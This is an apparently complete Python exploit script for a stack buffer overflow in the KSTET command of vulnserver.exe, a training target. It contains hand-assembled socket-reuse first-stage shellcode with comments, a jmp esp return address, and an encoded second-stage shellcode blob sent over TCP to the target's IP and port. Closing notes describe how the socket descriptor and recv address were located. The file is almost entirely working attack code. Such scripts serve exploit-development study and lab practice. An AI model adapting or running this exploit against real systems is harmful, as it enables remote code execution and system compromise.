#!/usr/bin/python
import socket 
import os 
import sys
import struct
import time
IP=sys.argv[1]
port=sys.argv[2]

socket_reuse = (		# to receive second stage shellcode
"\x8b\xcc"             # mov ecx,esp
"\x66\x81\xc1\x88\x01"      # add cx,188	->  ecx will hold the address where the app's socket is saved. we will reuse it
"\x83\xec\x50"          # sub esp,50. Fix the stack to avoid trouble
"\x33\xd2"             # xor edx,edx
"\x52"               # push edx
"\x80\xc6\x02"          # add dh,2
"\x52"               # push edx
"\x8b\xd4"             # mov edx,esp
"\x83\xc2\x50"          # add edx,50
"\x52"               # push edx
"\xff\x31"             # push dword ptr ds:[ecx]
"\xb8\x60\x29\x01\x02"      # mov eax,2012960	-----> the recv call address shifted to left 3 times
"\xc1\xe8\x03"          # shr eax,3			-----> reconstruct the address to recv
"\xff\xd0"             # call eax
) 

payload = "KSTET /.:/"
payload += "\x90"*(66-10-len(socket_reuse))
payload += socket_reuse
payload += "\x90"*10
payload += struct.pack("<I", 0x625011AF)	#jmp esp
payload += "\xeb\xb7"	#short jmp
payload += "\x90"*20+"B"*500

shellcode  = "\xda\xca\xd9\x74\x24\xf4\xbf\x5d\xf6\x8a\xbf\x58"
shellcode += "\x31\xc9\xb1\x56\x31\x78\x18\x03\x78\x18\x83\xc0"
shellcode += "\x59\x14\x7f\x43\x89\x5a\x80\xbc\x49\x3b\x08\x59"
shellcode += "\x78\x7b\x6e\x29\x2a\x4b\xe4\x7f\xc6\x20\xa8\x6b"
shellcode += "\x5d\x44\x65\x9b\xd6\xe3\x53\x92\xe7\x58\xa7\xb5"
shellcode += "\x6b\xa3\xf4\x15\x52\x6c\x09\x57\x93\x91\xe0\x05"
shellcode += "\x4c\xdd\x57\xba\xf9\xab\x6b\x31\xb1\x3a\xec\xa6"
shellcode += "\x01\x3c\xdd\x78\x1a\x67\xfd\x7b\xcf\x13\xb4\x63"
shellcode += "\x0c\x19\x0e\x1f\xe6\xd5\x91\xc9\x37\x15\x3d\x34"
shellcode += "\xf8\xe4\x3f\x70\x3e\x17\x4a\x88\x3d\xaa\x4d\x4f"
shellcode += "\x3c\x70\xdb\x54\xe6\xf3\x7b\xb1\x17\xd7\x1a\x32"
shellcode += "\x1b\x9c\x69\x1c\x3f\x23\xbd\x16\x3b\xa8\x40\xf9"
shellcode += "\xca\xea\x66\xdd\x97\xa9\x07\x44\x7d\x1f\x37\x96"
shellcode += "\xde\xc0\x9d\xdc\xf2\x15\xac\xbe\x9a\xda\x9d\x40"
shellcode += "\x5a\x75\x95\x33\x68\xda\x0d\xdc\xc0\x93\x8b\x1b"
shellcode += "\x51\xb3\x2b\xf3\xd9\xd4\xd5\xf4\x19\xfc\x11\xa0"
shellcode += "\x49\x96\xb0\xc9\x02\x66\x3c\x1c\xbe\x6c\xaa\x5f"
shellcode += "\x96\x70\xab\x08\xe4\x72\xbd\x60\x61\x94\x91\x20"
shellcode += "\x21\x09\x52\x91\x81\xf9\x3a\xfb\x0e\x25\x5a\x04"
shellcode += "\xc5\x4e\xf1\xeb\xb3\x27\x6e\x95\x9e\xbc\x0f\x5a"
shellcode += "\x35\xb9\x10\xd0\xbf\x3d\xde\x11\xca\x2d\x37\x46"
shellcode += "\x34\xae\xc8\xe3\x34\xc4\xcc\xa5\x63\x70\xcf\x90"
shellcode += "\x43\xdf\x30\xf7\xd0\x18\xce\x86\xe0\x53\xf9\x1c"
shellcode += "\x4c\x0c\x06\xf1\x4c\xcc\x50\x9b\x4c\xa4\x04\xff"
shellcode += "\x1f\xd1\x4a\x2a\x0c\x4a\xdf\xd5\x64\x3e\x48\xbe"
shellcode += "\x8a\x19\xbe\x61\x75\x4c\xbc\x66\x89\x12\xeb\xce"
shellcode += "\xe1\xec\xab\xee\xf1\x86\x2b\xbf\x99\x5d\x03\x30"
shellcode += "\x69\x9d\x8e\x19\xe1\x14\x5f\xeb\x90\x29\x4a\xad"
shellcode += "\x0c\x29\x79\x76\xbf\x50\xf2\x89\x40\xa5\x1a\xee"
shellcode += "\x41\xa5\x22\x10\x7e\x73\x1b\x66\x41\x47\x18\x79"
shellcode += "\xf4\xea\x09\x10\xf6\xb9\x4a\x31"

print "[*] Sending evil KSTET request to vulnserver.exe"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((IP, int(port)))
print "[*] Sending first stage payload"
expl.send(payload)
time.sleep(1)
print "[*] Sending second stage payload"
expl.send(shellcode)
expl.close()


# Stack SS:[011BFB80]=00000050  -----> after tracing the recv instruction in the program, it turns out this is where the current thread is saving the socket file descriptor. We can reuse this FD to make a shellcode to receive the second stage shellcode from our exploit.

# 0040252C    $-FF25 F4614000   JMP DWORD PTR DS:[<&WS2_32.recv>]                  ;  WS2_32.recv -----> we can also reuse the call to recv in the program. we can get rid of the null byte by shifting the address to the left.
